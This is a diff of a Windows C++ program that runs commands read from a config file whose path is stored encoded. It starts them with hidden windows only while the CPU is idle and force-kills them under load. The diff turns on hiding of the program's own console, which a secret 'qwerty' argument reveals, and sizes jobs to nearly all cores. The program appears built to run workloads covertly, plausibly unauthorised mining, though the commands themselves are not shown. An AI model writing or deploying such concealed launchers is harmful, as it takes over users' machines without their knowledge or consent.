@@ -17,12 +17,12 @@
 #include <windows.h>
 
 #include "xstr.hpp"
+#include "cpusage.hpp"
 
 using namespace std;
 
 FILE* pipe = NULL;
 
-int CPU = 0;
 int IDLE = 0;
 int BUSY = 0;
 
@@ -34,10 +34,12 @@ bool cons = false;
 vector<hide::line> Run;
 std::stack<DWORD> JOBs;
 
-#define TIMEOUT     10
+#define TIMEOUT     50
 #define DEADLINE    5 
 
-int THRMAX = 3;
+int THRMAX = 1;
+
+cpusage CPU;
 
 void job (void)
 {
@@ -49,8 +51,7 @@ void job (void)
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
 
-cout << "Run: " << Run[PooID].c_str() << endl;
-
+//cout << "Run: " << Run[PooID].c_str() << endl;
     ::CreateProcess(NULL, (LPSTR) Run[PooID].c_str(), NULL, NULL, FALSE, 
               CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
 
@@ -63,34 +64,23 @@ cout << "Run: " << Run[PooID].c_str() << endl;
  * ==================
  */
 void CALLBACK CPUsage ( HWND wnd , UINT uMsg , UINT Id , DWORD dwTime) { 
-static string percent;
-static char buff[16];
-FILE* wmic = ::popen("wmic cpu get loadpercentage", "r"); 
-if(!wmic)
-    throw runtime_error("wmic fail");
 
-while( ::fgets(buff, sizeof(buff), wmic)!=NULL) {
-    percent = buff;
-    if ( isdigit( *percent.begin()) ) break;
-}
-::pclose(wmic);
-istringstream sper(percent);
-sper >> CPU;
+int Idle = CPU.Idle();
 
-if (show_cpu) cout << CPU << endl;
+//if (show_cpu) cout << Idle << " JOBs: " << JOBs.size() << "MAX: " << THRMAX << endl;
 
-if ( ((100 - CPU) > 20) && JOBs.size() < THRMAX ) {
+if ( Idle > 25 && JOBs.size() < THRMAX ) {
    ++IDLE;  
 
-cout << "IDLE: " << IDLE << endl;
+//cout << "IDLE: " << IDLE << endl;
 
 }
 else IDLE = 0;
 
-if ((100 - CPU) < 5 && JOBs.size() > 1) {
+if ( Idle < 10 && JOBs.size() ) {
    ++BUSY;  
 
-cout << "BUSY: " << BUSY << endl;
+//cout << "BUSY: " << BUSY << endl;
 
 }
 else BUSY = 0;
@@ -98,17 +88,16 @@ else BUSY = 0;
 if (IDLE == TIMEOUT) {
     IDLE = 0;
     job();
-    ::popen("wmic process where name=\"GameCenterMailRu.exe\" setpriority=128", "r");
 
 } else 
     if (BUSY == DEADLINE) {
         BUSY = 0;
-        stringstream pid("taskkill /PID ");
-        pid << JOBs.top();
-
-cout << pid.str() << endl;
-        ::popen(pid.str().c_str(), "r");
+        stringstream pid;
+        pid << "taskkill /F /PID " << JOBs.top() << flush;
         JOBs.pop();
+
+//cout << pid.str() << endl;
+        ::popen(pid.str().c_str(), "r");
    }
 
 }
@@ -138,9 +127,9 @@ if (argc > 1) {
     if (arg == "qwerty") cons = true;
 }
 
-//if (!cons) ::ShowWindow( ::GetConsoleWindow(), SW_HIDE );
+if (!cons) ::ShowWindow( ::GetConsoleWindow(), SW_HIDE );
 
-static hide::line name("FJUC7Qibj6LAL8FrYUsJ5jbGMpMogbSdwCvpWGB/Jc822zvPVJ2GuVeh");
+static hide::line name("");
     name.decode();
     if (cons) cout << name << endl;
     ifstream  ini( name.c_str(), ios::in); 
@@ -167,12 +156,18 @@ if (cons)
 if ( !Run.size())
     throw runtime_error("never mind");
 
+char buff[4];
+::GetEnvironmentVariable( "NUMBER_OF_PROCESSORS", buff, sizeof buff);
+stringstream kerns(buff);
+kerns >> THRMAX;
+THRMAX--;
+
 thread th1(Timer);
 th1.detach();
 
 static string console;
 while ( getline (cin, console)) {
-    cout << console << " what?!" << endl;
+ //   cout << console << " CPU% " << CPU.GetCPULoad() * 100 << endl;
 }
 
 return 0;
